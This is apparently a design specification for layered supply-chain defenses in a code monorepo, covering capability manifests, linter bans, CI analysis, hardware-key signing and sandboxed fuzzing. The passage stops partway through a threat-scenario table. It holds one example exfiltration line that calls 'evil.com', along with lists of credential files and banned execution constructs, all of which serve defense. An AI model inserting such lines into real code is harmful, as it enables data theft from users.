# 13 — Capability Security

## Overview

This specification defines a capability-based security system for the coding-adventures
monorepo. It addresses one question: **if a maintainer's credentials are compromised, what
prevents an attacker from publishing malicious code?**

The system is not a runtime sandbox. It is **friction engineering** — a series of layered
barriers where each layer is bypassable in isolation, but every bypass requires a separate
visible action that leaves an audit trail. The combination makes attacks slow, loud, and
reviewable. The only hard stop is a hardware security key (YubiKey/FIDO2) — everything
else is speed bumps that produce evidence.

## Threat Model

### Attacker Profile

The attacker has full access to a maintainer's GitHub account: password, session tokens,
personal access tokens. They can push commits, create branches, create releases, approve
pull requests, and potentially modify CI/CD workflows.

### Attacker Goal

Publish a new version of an existing package to a public registry (PyPI, RubyGems, npm)
containing malicious code — typically data exfiltration, cryptocurrency wallet theft, or
credential harvesting. The malicious version reaches downstream users who run `pip install`
or `gem install`.

### Assumptions (What the Attacker Cannot Do)

1. **Physical hardware access.** The attacker cannot touch the maintainer's hardware
   security key. YubiKeys require a physical press to sign; FIDO2 keys cannot be cloned
   or operated remotely.

2. **Simultaneous multi-account compromise.** The attacker compromises one maintainer,
   not all of them at the same time.

### The Honesty Principle

This system is "purely on the developer front." A developer who does not initialize the
secure wrappers, does not use SecureFile, and turns off the linter can bypass everything
except the hardware-key gate. But every such bypass produces a diff visible in pull
requests, git history, and CI logs.

We document every bypass path and its visibility. Security through obscurity is not
security at all.

---

## The Friction Stack

The system has seven layers. Each is designed to slow an attacker and create audit trail.
The table below is honest about what it takes to bypass each layer.

```
┌─────────────────────────────────────────────────────────────────────┐
│  Layer 0: Zero External Dependencies                                │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │  Layer 0b: No Install Hooks                                   │  │
│  │  ┌─────────────────────────────────────────────────────────┐  │  │
│  │  │  Layer 1: Capability Manifest                            │  │  │
│  │  │  ┌───────────────────────────────────────────────────┐   │  │  │
│  │  │  │  Layer 2: Secure Wrappers                         │   │  │  │
│  │  │  │  ┌─────────────────────────────────────────────┐  │   │  │  │
│  │  │  │  │  Layer 3: Linter Rules + Banned Constructs  │  │   │  │  │
│  │  │  │  │  ┌──────────────────────────────────────┐   │  │   │  │  │
│  │  │  │  │  │  Layer 4: CI Gate (Static Analysis)  │   │  │   │  │  │
│  │  │  │  │  │  ┌───────────────────────────────┐   │   │  │   │  │  │
│  │  │  │  │  │  │  Layer 5: Hardware-Key Gate   │   │   │  │   │  │  │
│  │  │  │  │  │  │  ┌────────────────────────┐   │   │   │  │   │  │  │
│  │  │  │  │  │  │  │  Layer 6: Sandbox Fuzz │   │   │   │  │   │  │  │
│  │  │  │  │  │  │  └────────────────────────┘   │   │   │  │   │  │  │
│  │  │  │  │  │  └───────────────────────────────┘   │   │  │   │  │  │
│  │  │  │  │  └──────────────────────────────────────┘   │  │   │  │  │
│  │  │  │  └─────────────────────────────────────────────┘  │   │  │  │
│  │  │  └───────────────────────────────────────────────────┘   │  │  │
│  │  └─────────────────────────────────────────────────────────┘  │  │
│  └───────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

| # | Layer | Threat Mitigated | How to Bypass | Trail Left by Bypass |
|---|-------|-----------------|---------------|---------------------|
| 0 | **Zero Dependencies** | Dependency confusion, transitive hijacking, event-stream-style attacks | N/A — no dependencies exist | N/A — attack surface removed entirely |
| 0b | **No Install Hooks** | Malicious post-install scripts (most common PyPI/npm malware vector) | N/A — hooks banned by policy, verified by CI | N/A — attack surface removed entirely |
| 1 | **Capability Manifest** | Malicious code uses undeclared OS capabilities | Edit the JSON manifest | Diff visible in PR; requires signed approval |
| 2 | **Secure Wrappers** | Direct stdlib calls bypass capability checks at dev time | Don't use them | Linter catches it at Layer 3 |
| 3 | **Linter Rules** | Raw stdlib usage or dynamic code execution sneaks past review | Edit linter config | Config change visible in diff |
| 4 | **CI Gate (Static)** | Modified code or config passes local checks | Modify CI workflow files | CODEOWNERS blocks; diff visible in git |
| 5 | **Hardware-Key Gate** | All merges to main and all publishes | **Cannot bypass remotely** | N/A — hard stop |
| 6 | **Sandbox Fuzz** | Static analysis misses dynamic capability usage | Modify CI workflow | Kernel-level enforcement; CODEOWNERS blocks |

### Cost to Attacker

An attacker with stolen GitHub credentials but no physical YubiKey hits **two independent
hard stops**:

1. **Cannot merge to main.** All commits to main require hardware-key-signed commits via
   GitHub branch protection.
2. **Cannot publish.** All publishes require a hardware-key-signed approval file (Python,
   Ruby) or a hardware-key-signed tag (Go).

Everything before the hardware-key gate is friction that creates audit trail. An attacker
who tries to bypass the linter, edit the manifest, or modify CI workflows leaves a trail
of suspicious diffs that make the compromise visible.

---

## Layer 0: Zero External Dependencies

### The Problem

The majority of real-world supply chain attacks exploit the dependency resolution process:

- **Dependency confusion** (PyTorch/torchtriton, 2023): An attacker registers a public
  package with the same name as a private dependency. The package manager fetches the
  malicious public version because it has a higher version number.

- **Transitive dependency hijacking** (event-stream, 2018): An attacker takes over a
  deeply nested dependency that nobody reviews. The malicious code rides into thousands of
  applications through the dependency tree.

- **MITM during resolution**: Package managers fetch dependencies over the network. Any
  compromise along the network path can substitute malicious packages.

### The Solution

Every published package from this monorepo is **self-contained with zero external
dependencies**. This eliminates the entire class of dependency-based attacks.

```
What the user installs:          What runs:
┌────────────────────────┐       ┌────────────────────────┐
│ ca-cpu-simulator       │       │ ca-cpu-simulator       │
│                        │  ══>  │ ├── gates.py (vendored)│
│ install_requires: []   │       │ ├── arith.py (vendored)│
│ (zero dependencies)    │       │ └── clock.py (vendored)│
└────────────────────────┘       └────────────────────────┘
```

### How It Works

In development, packages import each other normally through local paths. At publish time,
the build tool **vendors** dependency source code directly into the published artifact:

1. The build tool reads the package's dependency list from `pyproject.toml`, `.gemspec`, or
   `go.mod`.
2. For each monorepo dependency, it copies the source files into a `_vendored/` directory
   inside the package.
3. It rewrites imports to point to the vendored copies.
4. It strips all dependency declarations from the published metadata — `install_requires`
   becomes `[]`, `add_dependency` calls are removed.
5. It generates a `vendor_manifest.json` recording exactly what was vendored.

### Vendor Manifest Format

```json
{
  "vendored_dependencies": [
    {
      "package": "python/logic-gates",
      "version": "0.1.0",
      "source_commit": "abc123def456",
      "vendored_at": "2026-03-19T10:00:00Z",
      "files": ["gates.py", "utils.py"]
    }
  ]
}
```

The `source_commit` field is critical: it pins the vendored code to an exact commit. CI
verifies that the vendored files match the declared commit SHA. An attacker cannot tamper
with vendored code without the hash check catching it.

### Automated Re-Vendoring

When a dependency package (e.g., `logic-gates`) receives a bug fix:

1. A CI job identifies all packages that vendor `logic-gates`.
2. It creates a pull request with the updated vendored source for each affected package.
3. The PR includes a diff of what changed in the vendored code.
4. **A maintainer must approve each re-publish with a hardware-key signature.** No package
   reaches any registry without explicit human approval and a physical YubiKey touch.
5. Once approved, the publish workflow runs for each affected package.

The automation handles the chore. The human handles the authorization.

### Trade-Offs

We are honest about the costs:

- **Larger package sizes.** Vendored code is duplicated across packages. A user who
  installs both `ca-cpu-simulator` and `ca-arithmetic` gets two copies of `logic-gates`.
  This is acceptable for educational packages measured in kilobytes, not megabytes.

- **Bug fix propagation requires re-publishing.** Fixing a bug in `logic-gates` requires
  re-publishing every package that vendors it. The automated re-vendoring workflow handles
  the mechanical work, but each re-publish requires hardware-key approval.

- **Version drift.** The vendored copy is frozen at a specific commit. Downstream packages
  may contain older versions of vendored code until explicitly re-vendored.

---

## Layer 0b: No Install Hooks

### The Problem

The most common delivery mechanism for malicious packages is the **install-time hook**.
When a user runs `pip install malicious-package`, the package's `setup.py` can execute
arbitrary code — download malware, steal credentials, install backdoors — before the user
ever imports the package.

Every major registry has seen this attack:

- PyPI: Malicious `setup.py` with custom `install` commands
- npm: `preinstall` and `postinstall` scripts in `package.json`
- RubyGems: `extensions` and `extconf.rb` executing native compilation steps

### The Solution

All published packages from this monorepo contain **zero install-time executable code**.
This is enforced by policy, verified by CI, and validated in the publish pipeline.

### What Is Banned

| Language | Banned Artifacts | What They Do |
|----------|-----------------|-------------|
| **Python** | `setup.py` with custom commands | Executes arbitrary Python during `pip install` |
| **Python** | `[build-system]` post-install hooks | Runs code after package installation |
| **Python** | `data_files` pointing to executables | Places executables on the user's system |
| **Ruby** | `extensions` in gemspec | Triggers native compilation during `gem install` |
| **Ruby** | `extconf.rb` | Runs arbitrary Ruby during native extension build |
| **Ruby** | `post_install_message` with instructions to run commands | Social engineering |
| **Go** | `init()` functions performing IO | Executes side effects on package import |
| **TypeScript** | `preinstall`/`postinstall` in `package.json` | Executes arbitrary shell commands during `npm install` |

### Enforcement

The publish pipeline scans the built artifact (wheel, gem, tarball) before uploading:

1. Python wheels are inspected for `setup.py`, `setup.cfg` with custom commands, and
   `entry_points` that are not explicitly declared.
2. Ruby gems are inspected for `extensions` and `extconf.rb`.
3. TypeScript tarballs are inspected for `preinstall`, `postinstall`, `prepare` scripts.
4. Go packages are scanned for `init()` functions that call OS-level functions.

If any install-time executable code is found, the publish fails.

---

## Layer 1: Capability Manifest

### The Core Idea

Every package declares exactly what OS capabilities it needs in a file called
`required_capabilities.json`. Most packages in this monorepo declare **zero capabilities**
— they are pure computation that takes values in and returns values out, with no
interaction with the filesystem, network, processes, or environment.

This is inspired by OpenBSD's `unveil()` system call, which allows a process to declare
exactly which filesystem paths it will access. After the declaration, all other paths
become invisible. We apply the same principle at the package level: a package declares
what it needs, and everything else is denied.

### Capability Taxonomy

Capabilities use the format `category:action:target`, modeled after `unveil()`'s
path-level granularity.

```
category:action:target
   │       │      │
   │       │      └── What specific resource (path, host:port, variable name)
   │       └── What operation (read, write, connect, exec)
   └── What kind of resource (fs, net, proc, env)
```

| Category | Actions | Target Format | Examples |
|----------|---------|---------------|---------|
| `fs` | `read`, `write`, `create`, `delete`, `list` | Relative or absolute path, supports globs | `fs:read:../../grammars/*.tokens` |
| `net` | `connect`, `listen`, `dns` | `host:port` or `*:port` | `net:connect:api.example.com:443` |
| `proc` | `exec`, `fork`, `signal` | Command name or `*` | `proc:exec:git` |
| `env` | `read`, `write` | Variable name or `*` | `env:read:HOME` |
| `ffi` | `call`, `load` | Library name or `*` | `ffi:load:libssl` |
| `time` | `read`, `sleep` | `*` | `time:read:*` |
| `stdin` | `read` | `*` | `stdin:read:*` |
| `stdout` | `write` | `*` | `stdout:write:*` |

### Why This Granularity Matters

Consider the difference between these two declarations:

```
COARSE:  "This package needs filesystem access"
FINE:    "This package needs to read ../../grammars/*.tokens"
```

The coarse declaration allows a compromised package to read `~/.ssh/id_rsa`,
`~/.bitcoin/wallet.dat`, `~/.aws/credentials`, or any other file on disk. The fine
declaration restricts it to exactly the grammar files it needs. Everything else is denied.

This is the **Principle of Least Privilege** (Saltzer and Schroeder, 1975): every program
should operate using the least set of privileges necessary to complete the job.

### Manifest Format

The manifest file `required_capabilities.json` lives at the root of the package directory,
alongside `BUILD` and `pyproject.toml`/`.gemspec`/`go.mod`.

**Default deny: no manifest = zero capabilities.** A package without a
`required_capabilities.json` file is treated as pure computation with zero OS access. This
is the common case — most packages in this repo do not have a manifest because they do not
need one. The absence of the file IS the declaration: "this package needs nothing."

Only packages that actually need OS capabilities have a manifest file. This means:
- Adding a manifest to a previously pure package is itself a capability escalation
- The presence of a new `required_capabilities.json` in a PR is a security-relevant signal
- Reviewers and CI can flag any PR that adds a manifest file

**A package that reads grammar files (the uncommon case):**

```json
{
  "$schema": "https://raw.githubusercontent.com/adhithyan15/coding-adventures/main/code/specs/schemas/required_capabilities.schema.json",
  "version": 1,
  "package": "python/lexer",
  "capabilities": [
    {
      "category": "fs",
      "action": "read",
      "target": "../../grammars/*.tokens",
      "justification": "Reads token definition files to build the lexer's DFA at initialization time."
    }
  ],
  "justification": "Lexer reads grammar definition files. No write, network, or process access needed."
}
```

### Schema Rules

- `version`: Integer. Currently `1`. Allows schema evolution.
- `package`: Must match the build tool's qualified name (e.g., `python/logic-gates`).
- `capabilities`: Array of capability objects. Empty array means pure computation.
- Each capability has `category`, `action`, `target`, and `justification`.
- Top-level `justification` explains the overall capability profile.
- `banned_construct_exceptions`: Optional array listing any banned dynamic constructs this
  package is exempted from using (see Layer 3). Requires hardware-key-signed approval.

### Current Package Audit

Based on a scan of all packages in the monorepo:

**Zero capabilities (~90% of packages):**
logic-gates, arithmetic, clock, fp-arithmetic, pipeline, cpu-simulator, arm-simulator,
riscv-simulator, wasm-simulator, intel4004-simulator, jvm-simulator, clr-simulator,
bytecode-compiler, virtual-machine, jit-compiler, assembler, cache, branch-predictor,
hazard-detection, directed-graph, html-renderer, grammar-tools

These packages are pure computation. They take values in and return values out. They do
not read files, open sockets, spawn processes, or access environment variables.

**`fs:read` for grammar files (~10% of packages):**
lexer, parser, python-lexer, python-parser, ruby-lexer, ruby-parser, javascript-lexer,
javascript-parser, typescript-lexer, typescript-parser

These packages read `.tokens` and `.grammar` files from the `code/grammars/` directory.
Each declares exactly which file patterns it reads.

**No packages currently need:** network, process, environment, FFI, or write access.

---

## Layer 2: Secure Wrappers

### The Core Idea

For each OS capability category, we provide a drop-in replacement module that checks the
capability manifest before delegating to the real stdlib function. These wrappers are
**developer-facing guardrails**, not security boundaries. The real enforcement happens at
the CI gate (Layer 4) and the sandbox (Layer 6).

### Why Wrappers If They're Not Security Boundaries?

Three reasons:

1. **Fail-fast during development.** A developer adding filesystem access to a package
   immediately gets a `CapabilityViolationError` instead of discovering the problem when
   CI runs 10 minutes later.

2. **Audit trail via `grep`.** Every place a package touches the OS goes through a wrapper.
   `grep -r "SecureFile" src/` shows every filesystem access point. This makes code review
   faster and more reliable.

3. **Linter hook point.** The linter (Layer 3) can flag raw stdlib calls and suggest the
   wrapper. The wrapper makes the capability system visible in the source code.

### Python Wrappers (`ca-secure-io`)

```python
# secure_io/fs.py

import json
from pathlib import Path


class CapabilityViolationError(Exception):
    """Raised when code attempts an operation not declared in
    required_capabilities.json.

    This error means the package tried to access a resource it did not
    declare. To fix it, add the appropriate capability to
    required_capabilities.json and get hardware-key approval.
    """
    pass


class SecureFile:
    """Drop-in replacement for file operations that checks the capability
    manifest before each operation.

    Usage:
        fs = SecureFile()          # loads required_capabilities.json
        data = fs.read("data.txt") # checks fs:read:data.txt permission
    """

    def __init__(self, manifest_path="required_capabilities.json"):
        self._allowed = self._load_manifest(manifest_path)

    def _load_manifest(self, path):
        manifest_file = Path(path)
        if not manifest_file.exists():
            return []
        with open(manifest_file) as f:       # noqa: CAP001
            manifest = json.load(f)
        return manifest.get("capabilities", [])

    def _check(self, category, action, target):
        for cap in self._allowed:
            if (cap["category"] == category
                    and cap["action"] == action
                    and self._target_matches(cap["target"], target)):
                return
        raise CapabilityViolationError(
            f"Denied: {category}:{action}:{target}\n"
            f"This package has not declared this capability.\n"
            f"Add it to required_capabilities.json and get hardware-key approval."
        )

    def _target_matches(self, pattern, actual):
        # ... glob matching logic ...
        pass

    def read(self, path):
        self._check("fs", "read", str(path))
        with open(path) as f:                # noqa: CAP001
            return f.read()

    def write(self, path, content):
        self._check("fs", "write", str(path))
        with open(path, "w") as f:           # noqa: CAP001
            f.write(content)
```

Note the `# noqa: CAP001` comments on the raw `open()` calls. The wrapper itself is the
one place where raw stdlib calls are allowed. The linter exempts these specific lines.

### Ruby Wrappers (`ca_secure_io`)

```ruby
# lib/ca/secure_io/secure_file.rb

module CA
  module SecureIO
    class CapabilityViolationError < StandardError; end

    class SecureFile
      def initialize(manifest_path: "required_capabilities.json")
        @allowed = load_manifest(manifest_path)
      end

      def read(path, **opts)
        check!("fs", "read", path.to_s)
        ::File.read(path, **opts)  # rubocop:disable CA/DirectFileAccess
      end

      def write(path, content, **opts)
        check!("fs", "write", path.to_s)
        ::File.write(path, content, **opts)  # rubocop:disable CA/DirectFileAccess
      end

      private

      def check!(category, action, target)
        return if @allowed.any? { |cap|
          cap["category"] == category &&
          cap["action"] == action &&
          target_matches?(cap["target"], target)
        }

        raise CapabilityViolationError,
          "Denied: #{category}:#{action}:#{target}\n" \
          "Add this capability to required_capabilities.json."
      end
    end
  end
end
```

### Go Wrappers (`ca-secure-io`)

```go
// secureio/fs.go
package secureio

import (
    "fmt"
    "os"
)

type CapabilityViolationError struct {
    Category string
    Action   string
    Target   string
}

func (e *CapabilityViolationError) Error() string {
    return fmt.Sprintf("capability denied: %s:%s:%s", e.Category, e.Action, e.Target)
}

func ReadFile(m *Manifest, path string) ([]byte, error) {
    if err := m.Check("fs", "read", path); err != nil {
        return nil, err
    }
    return os.ReadFile(path) //nolint:cap
}
```

---

## Layer 3: Linter Rules and Banned Constructs

### Restricted Standard Library Usage

The linter flags any direct use of OS-level stdlib functions. Developers must use the
secure wrappers (Layer 2) instead.

**Python — flagged by capability linter (rule `CAP001`):**

```python
# BAD — linter error CAP001
f = open("data.txt")
data = pathlib.Path("data.txt").read_text()
os.listdir(".")

# GOOD — uses secure wrapper
fs = SecureFile()
data = fs.read("data.txt")
```

**Ruby — flagged by custom RuboCop cop (`CA/DirectFileAccess`):**

```ruby
# BAD — cop violation
data = File.read("data.txt")
Dir.glob("*.txt")

# GOOD — uses secure wrapper
fs = CA::SecureIO::SecureFile.new
data = fs.read("data.txt")
```

**Go — flagged by custom go vet analyzer:**

```go
// BAD — vet warning
data, _ := os.ReadFile("data.txt")

// GOOD — uses secure wrapper
data, _ := secureio.ReadFile(manifest, "data.txt")
```

### Banned Dynamic Execution Constructs

These constructs are **banned outright** — no capability declaration can authorize them.
The linter hard-fails on any usage. They exist because they are the primary mechanism for
evading static analysis. An attacker who cannot use `eval()` or `__import__()` must use
direct imports, which the static analyzer catches trivially.

**Python — banned constructs:**

| Construct | Why It's Dangerous |
|-----------|-------------------|
| `eval()` | Executes arbitrary Python code from a string |
| `exec()` | Executes arbitrary Python statements from a string |
| `compile()` | Creates code objects from strings (precursor to eval/exec) |
| `__import__()` | Imports modules by string name, evading static import analysis |
| `importlib.import_module()` | Same as `__import__()` but official API |
| `getattr()` on modules | Accesses module attributes by string, enabling dynamic capability access |
| `globals()` / `locals()` | Provides dict access to scope, enabling injection |
| `pickle.loads()` | Deserializes arbitrary Python objects, including code |
| `marshal.loads()` | Deserializes Python bytecode |
| `ctypes` | Calls arbitrary C functions, bypassing all Python-level restrictions |

**Ruby — banned constructs:**

| Construct | Why It's Dangerous |
|-----------|-------------------|
| `eval()` | Executes arbitrary Ruby code from a string |
| `instance_eval()` | Evaluates code in the context of an object |
| `class_eval()` / `module_eval()` | Evaluates code in the context of a class/module |
| `send()` with non-literal argument | Calls any method by string name |
| `public_send()` with non-literal argument | Same, respects visibility but still dynamic |
| `method_missing` | Intercepts calls to undefined methods (flagged for review) |
| `Binding.eval` | Evaluates code with access to a binding's local variables |
| `Object.const_get()` with non-literal | Resolves constants dynamically |
| `` `backticks` ``, `system()`, `%x{}` | Executes shell commands |
| `Kernel.exec` | Replaces process with shell command |

**Go — banned constructs:**

| Construct | Why It's Dangerous |
|-----------|-------------------|
| `reflect.Value.Call()` | Invokes functions dynamically by reflection |
| `plugin.Open()` | Loads shared libraries at runtime |
| `//go:linkname` | Accesses unexported symbols from other packages |
| `unsafe.Pointer` arithmetic | Bypasses Go's type and memory safety |
| `import "C"` (CGo) | Calls arbitrary C code, bypassing all Go restrictions |

### Exception Process

If a package genuinely needs a banned construct (for example, the capability analyzer
itself uses `ast` which involves `compile()`), it must:

1. Declare the exception in `required_capabilities.json` under `banned_construct_exceptions`:

```json
{
  "banned_construct_exceptions": [
    {
      "construct": "compile",
      "language": "python",
      "justification": "The capability analyzer uses compile() to parse source into AST for static analysis. No user-provided strings are ever compiled."
    }
  ]
}
```

2. Obtain hardware-key-signed approval, just like any capability escalation.

For Go, the FFI-style constructs require a second declaration in addition to the
exception itself:

- `import "C"` also requires an `ffi:call:*` capability (or a specific
  `ffi:call:<library>` target)
- `plugin.Open()` also requires an `ffi:load:*` capability (or a specific
  `ffi:load:<library>` target)

This keeps native interop explicitly opt-in instead of silently turning
`banned_construct_exceptions` into a blanket escape hatch.

---

## Layer 4: CI Gate (Static Analysis)

### How It Works

The CI gate runs **independently of the linter**. Even if an attacker disables the linter
in a package's BUILD file, the CI gate performs its own static analysis as a separate job
in the GitHub Actions workflow.

```
┌──────────────┐    ┌──────────────────┐    ┌────────────────┐
│ Package code  │───>│ Static analyzer   │───>│ Detected       │
│ (source files)│    │ (AST walking)     │    │ capabilities   │
└──────────────┘    └──────────────────┘    └───────┬────────┘
                                                     │
                                                     v
                                              ┌──────────────┐
┌──────────────────────┐                      │ COMPARE      │──> PASS or FAIL
│ required_capabilities│─────────────────────>│              │
│ .json (manifest)     │                      └──────────────┘
└──────────────────────┘
```

The static analyzer walks the AST of every source file in the package and builds a list
of detected capabilities. It then compares this list against the manifest:

- If the detected capabilities are a **subset** of the declared capabilities: **PASS**.
- If any detected capability is **not declared** in the manifest: **FAIL**.

### Static Analyzer Implementation

Each language gets its own analyzer implemented using the language's native AST library:

| Language | AST Library | Package |
|----------|-------------|---------|
| Python | `ast` (stdlib) | `code/packages/python/ca-capability-analyzer/` |
| Ruby | `prism` (Ruby 3.3+ default parser) | `code/packages/ruby/ca_capability_analyzer/` |
| Go | `go/ast` + `go/parser` (stdlib) | `code/packages/go/ca-capability-analyzer/` |
| TypeScript | `typescript` compiler API | `code/packages/typescript/ca-capability-analyzer/` |

### What the Analyzer Detects

**Python:**

| AST Pattern | Detected Capability |
|-------------|-------------------|
| `import os`, `from os import *` | `fs:*:*` (broad filesystem access) |
| `open(path)`, `pathlib.Path(path).read_text()` | `fs:read:{path}` if path is a string literal, `fs:read:*` otherwise |
| `import socket`, `from socket import *` | `net:*:*` |
| `import subprocess`, `os.system(cmd)` | `proc:exec:*` |
| `os.environ[key]`, `os.getenv(key)` | `env:read:{key}` if key is a string literal |
| `import ctypes`, `import cffi` | `ffi:*:*` |

**Ruby:**

| AST Pattern | Detected Capability |
|-------------|-------------------|
| `File.open`, `File.read`, `File.write` | `fs:{action}:{path}` |
| `Dir.glob`, `Dir.entries` | `fs:list:{pattern}` |
| `require "socket"`, `TCPSocket.new` | `net:*:*` |
| `require "net/http"`, `Net::HTTP.get` | `net:connect:*` |
| `ENV[key]`, `ENV.fetch(key)` | `env:read:{key}` |

**Go:**

| Import or Call | Detected Capability |
|---------------|-------------------|
| `import "os"` + `os.Open`, `os.ReadFile` | `fs:read:*` |
| `import "os"` + `os.Create`, `os.WriteFile` | `fs:write:*` |
| `import "net"`, `import "net/http"` | `net:*:*` |
| `import "os/exec"` | `proc:exec:*` |
| `os.Getenv`, `os.Environ` | `env:read:*` |

### Integration with Build System

The static analyzer runs as part of the package's BUILD commands and also independently
in the publish pipeline's `capability-gate` job. This means an attacker must bypass it in
two places:

1. The package's own BUILD file (which they can modify)
2. The publish workflow's independent `capability-gate` job (protected by CODEOWNERS)

---

## Layer 5: Hardware-Key Gate

### The Hard Stop

This is the only layer that **cannot be bypassed remotely**. It requires physical
possession of a hardware security key (YubiKey, SoloKey, or any FIDO2-compatible device).

Two operations require hardware-key signatures:

1. **Merging to main.** GitHub branch protection is configured to require signed commits.
   Only commits signed with SSH keys listed in `CAPABILITY_SIGNERS` can be merged.

2. **Publishing a package.** Every publish requires a hardware-key-signed approval file
   committed to the repository. For Go packages (which require git tags), the tag itself
   must be signed.

### CAPABILITY_SIGNERS

A file at the repository root listing the SSH public keys authorized to approve publishes
and capability escalations:

```
# CAPABILITY_SIGNERS
# Each line is an SSH public key authorized to sign publish approvals.
# Keys should be backed by FIDO2 hardware (YubiKey, SoloKey).
# Changes to this file require a signature from an existing key.

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG... maintainer-1@yubikey
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH... maintainer-2@yubikey
```

This file is protected by:
- **CODEOWNERS:** Changes require review from an existing signer.
- **Circular verification:** CI checks that any modification to `CAPABILITY_SIGNERS` is
  itself signed by a key that was in the file before the modification.

An attacker cannot add their own key without an existing signer's physical YubiKey touch.

### Publish Approval Flow

**For Python and Ruby (tag-free publishing):**

Publishing is triggered by merging a hardware-key-signed approval file. No tags, no
GitHub Releases, no `workflow_dispatch` — the approval file IS the trigger.

```
1. Maintainer runs: ./publish-approve python/logic-gates v0.1.0
2. Tool generates approval JSON:
   {
     "package": "python/logic-gates",
     "version": "0.1.0",
     "commit": "abc123def456",
     "approved_by": "maintainer-1@yubikey",
     "approved_at": "2026-03-19T10:00:00Z"
   }
3. Tool prompts for YubiKey touch to sign the JSON via ssh-keygen -Y sign
4. Signed approval + detached signature committed to publish_approvals/
5. PR merged to main → CI detects new approval file → publish workflow triggers
```

**For Go (tags required by ecosystem):**

Go modules resolve versions via git tags (`go get pkg@v1.2.3`). Tags cannot be eliminated,
but they can be secured:

- GitHub repository rulesets protect tag patterns (`go/**`)
- Tags must be signed with a key from `CAPABILITY_SIGNERS`
- Tagged commit must pass all CI status checks
- "Do not allow bypass" is enabled — even admins cannot create unsigned tags

### Capability Escalation

Adding a new capability to a package is a **stricter sub-category** of publish approval.
The escalation approval includes additional fields:

```json
{
  "type": "capability_escalation",
  "package": "python/lexer",
  "previous_capabilities": [],
  "new_capabilities": [
    {"category": "fs", "action": "read", "target": "../../grammars/*.tokens"}
  ],
  "reason": "Lexer needs to read grammar definition files to build the DFA.",
  "approved_by": "maintainer-1@yubikey",
  "approved_at": "2026-03-19T10:00:00Z"
}
```

CI verifies:
1. The approval's `new_capabilities` match the package's current `required_capabilities.json`.
2. The approval's `previous_capabilities` match what was on main before this change.
3. The signature is valid against a key in `CAPABILITY_SIGNERS`.

---

## Layer 6: Sandbox Fuzz Verification

### The Problem Static Analysis Can't Solve

Static analysis (Layer 4) catches direct `import socket` or `os.Open()` calls. But it
cannot catch capabilities accessed through patterns the AST walker doesn't recognize.
Even with banned constructs (Layer 3), there may be edge cases.

The sandbox provides **kernel-level runtime verification** — the definitive proof that a
package only uses its declared capabilities.

### How It Works

Before publishing, the CI pipeline runs the package's **fuzz tests** inside a Linux
namespace sandbox configured from `required_capabilities.json`.

```
┌─────────────────────────────────────────────────────────┐
│ Linux Namespace Sandbox                                  │
│                                                          │
│  Landlock rules (from required_capabilities.json):       │
│  ┌────────────────────────────────────────────────────┐  │
│  │  fs:read:../../grammars/*.tokens → mount read-only │  │
│  │  Everything else → DENIED by kernel                │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  seccomp-BPF filter:                                     │
│  ┌────────────────────────────────────────────────────┐  │
│  │  connect() → BLOCKED (no net capabilities declared)│  │
│  │  execve()  → BLOCKED (no proc capabilities declared│  │
│  │  open()    → ALLOWED only for Landlock-approved path│  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  Inside sandbox:                                         │
│  ┌────────────────────────────────────────────────────┐  │
│  │  Coverage-guided fuzzer generates random inputs     │  │
│  │  to the package's public API for 60 seconds.       │  │
│  │                                                     │  │
│  │  If any code path triggers a blocked syscall:       │  │
│  │  → Kernel returns EPERM                             │  │
│  │  → Sandbox runner detects the violation             │  │
│  │  → PUBLISH FAILS                                    │  │
│  └────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

### Fuzz Testing, Not Just Unit Tests

Running the existing test suite inside the sandbox is necessary but not sufficient. Tests
only cover code paths the developer wrote them for. A motivated attacker can craft code
that passes all tests but activates malicious behavior only on specific inputs.

**Fuzz testing** generates random and adversarial inputs to explore code paths the test
suite misses. Even 60 seconds of coverage-guided fuzzing can reach code paths that a
carefully crafted test suite deliberately avoids.

| Language | Fuzz Framework | Type |
|----------|---------------|------|
| **Python** | `hypothesis` | Property-based testing — generates inputs matching type specs |
| **Python** | `atheris` | Coverage-guided fuzzing built on libFuzzer |
| **Ruby** | `rantly` | Property-based testing |
| **Go** | `testing/F` | Built-in coverage-guided fuzz support (Go 1.18+) |

Each package defines fuzz targets in a `fuzz/` directory alongside its tests.

### Sandbox Technology

The sandbox uses two complementary Linux kernel features available on GitHub Actions
runners (Ubuntu, kernel 5.13+):

**Landlock LSM** — path-level filesystem restriction:
- Maps `required_capabilities.json` filesystem entries to Landlock rules
- Zero-capability packages: no filesystem rules → all filesystem access denied
- `fs:read:../../grammars/*.tokens` → mount those paths read-only, deny everything else

**seccomp-BPF** — syscall-level restriction:
- Blocks syscalls not implied by the declared capabilities
- No `net:*` capabilities → `connect()`, `bind()`, `listen()` return EPERM
- No `proc:*` capabilities → `execve()`, `fork()` return EPERM

These are **kernel-level enforcement mechanisms**. Unlike Deno's userspace permission
model (which has known symlink escapes and is "partially broken" per NDSS 2025), the
kernel cannot be bypassed by application code.

### Honest Limitations

- **Extremely narrow triggers may survive.** Code that only activates on input
  `"xK7#mQ9..."` (a specific 128-byte string) may not be found by 60 seconds of fuzzing.
  This is inherent to any dynamic analysis approach.

- **Sandbox is Linux-only.** macOS and Windows do not have Landlock. The sandbox runs
  in CI (which is Linux), not on developer machines.

- **Coverage-guided fuzzing requires fuzz targets.** Packages without fuzz targets get
  only basic test-suite-in-sandbox verification, which is weaker.

---

## Threat Scenarios

### Scenario 1: Inject exfiltration into a pure-computation package

**Attack vector:** Add `import socket; socket.connect(("evil.com", 443))` to
`logic-gates`, a pure-computation package with zero declared capabilities.

| Step | Attacker Action | Layer Hit | Result |
|------|----------------|-----------|--------|
| 1 | Push commit with socket code | Layer 3 (Linter) | CI fails — raw `socket` import flagged |
| 2 | Disable linter in BUILD file | Layer 4 (CI Gate) | Independent static analysis detects `net:connect` not in manifest |
| 3 | Edit manifest to add `net:connect` | Layer 5 (Hardware Key) | **Blocked** — no signed approval, YubiKey required |

**Outcome:** Attack requires 3 separate commits. Stopped at hardware-key gate.

### Scenario 2: Create a new malicious package

**Attack vector:** Create `code/packages/python/ca-helpful-utility/` with backdoor code.

| Step | Attacker Action | Layer Hit | Result |
|------|----------------|-----------|--------|
